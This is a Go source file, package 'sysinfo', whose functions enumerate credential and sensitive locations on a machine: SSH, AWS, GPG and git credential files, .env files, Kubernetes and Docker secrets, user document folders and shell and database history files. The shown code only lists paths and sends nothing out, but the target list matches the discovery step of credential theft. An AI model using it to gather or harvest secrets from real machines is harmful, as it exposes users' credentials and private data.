package sysinfo

import (
	"os"
	"path/filepath"
	"runtime"
	"strconv"
)

// ConfigPaths returns config/dotfile paths: ~/.*, /etc, ~/.config, ~/Library, %APPDATA%.
func ConfigPaths() []string {
	home, _ := os.UserHomeDir()
	var paths []string

	if home != "" {
		dotfiles := []string{
			".ssh", ".aws", ".gnupg", ".config",
			".npmrc", ".netrc", ".pgpass", ".my.cnf",
			".gitconfig", ".git-credentials",
			".env", ".env.local",
		}
		for _, d := range dotfiles {
			p := filepath.Join(home, d)
			if _, err := os.Stat(p); err == nil {
				paths = append(paths, p)
			}
		}
	}

	switch runtime.GOOS {
	case "linux":
		for _, p := range []string{"/etc"} {
			if info, err := os.Stat(p); err == nil && info.IsDir() {
				paths = append(paths, p)
			}
		}
	case "darwin":
		for _, p := range []string{"/etc", "/usr/local/etc"} {
			if info, err := os.Stat(p); err == nil && info.IsDir() {
				paths = append(paths, p)
			}
		}
		if home != "" {
			if p := filepath.Join(home, "Library"); dirExists(p) {
				paths = append(paths, p)
			}
		}
	case "windows":
		if appdata := os.Getenv("APPDATA"); appdata != "" && dirExists(appdata) {
			paths = append(paths, appdata)
		}
		if localAppdata := os.Getenv("LOCALAPPDATA"); localAppdata != "" && dirExists(localAppdata) {
			paths = append(paths, localAppdata)
		}
	}

	return paths
}

// DockerKubePaths returns Docker and Kubernetes config/secret paths.
func DockerKubePaths() []string {
	home, _ := os.UserHomeDir()
	var paths []string

	if home != "" {
		for _, d := range []string{".docker", ".kube"} {
			p := filepath.Join(home, d)
			if dirExists(p) {
				paths = append(paths, p)
			}
		}
	}

	k8sSecrets := []string{
		"/var/run/secrets/kubernetes.io",
		"/run/secrets",
	}
	for _, p := range k8sSecrets {
		if dirExists(p) {
			paths = append(paths, p)
		}
	}

	if runtime.GOOS == "linux" {
		if dirExists("/var/lib/docker") {
			paths = append(paths, "/var/lib/docker")
		}
	}

	return paths
}

// DesktopPaths returns user Desktop, Documents, Downloads directories.
func DesktopPaths() []string {
	home, _ := os.UserHomeDir()
	if home == "" {
		return nil
	}

	var paths []string
	for _, d := range []string{"Desktop", "Documents", "Downloads"} {
		p := filepath.Join(home, d)
		if dirExists(p) {
			paths = append(paths, p)
		}
	}
	return paths
}

// LogsWebappPaths returns log and web application paths.
func LogsWebappPaths() []string {
	var paths []string

	candidates := []string{
		"/var/log",
		"/var/www",
		"/srv",
		"/opt",
	}

	if runtime.GOOS == "windows" {
		candidates = []string{
			`C:\inetpub`,
		}
	}

	for _, p := range candidates {
		if dirExists(p) {
			paths = append(paths, p)
		}
	}
	return paths
}

// TmpfsPaths returns tmpfs/ramfs/shm paths.
func TmpfsPaths() []string {
	var paths []string
	candidates := []string{
		"/tmp",
		"/dev/shm",
		"/run/secrets",
		"/var/run/secrets",
	}

	if uid := os.Getuid(); uid >= 0 {
		candidates = append(candidates, filepath.Join("/run/user", strconv.Itoa(uid)))
	}

	if runtime.GOOS == "windows" {
		candidates = []string{os.TempDir()}
	}

	for _, p := range candidates {
		if dirExists(p) {
			paths = append(paths, p)
		}
	}
	return paths
}

// HistoryFiles returns shell/tool history files for the current user.
func HistoryFiles() []string {
	home, err := os.UserHomeDir()
	if err != nil {
		return nil
	}

	names := []string{
		".bash_history",
		".zsh_history",
		".sh_history",
		".fish_history",
		".python_history",
		".node_repl_history",
		".mysql_history",
		".psql_history",
		".rediscli_history",
		".mongosh",
		".sqlite_history",
		".irb_history",
		".lesshst",
	}

	var files []string
	for _, name := range names {
		p := filepath.Join(home, name)
		if info, err := os.Stat(p); err == nil && !info.IsDir() {
			files = append(files, p)
		}
	}

	xdg := []string{
		filepath.Join(home, ".local", "share", "fish", "fish_history"),
	}
	for _, p := range xdg {
		if info, err := os.Stat(p); err == nil && !info.IsDir() {
			files = append(files, p)
		}
	}

	return files
}

func dirExists(p string) bool {
	info, err := os.Stat(p)
	return err == nil && info.IsDir()
}
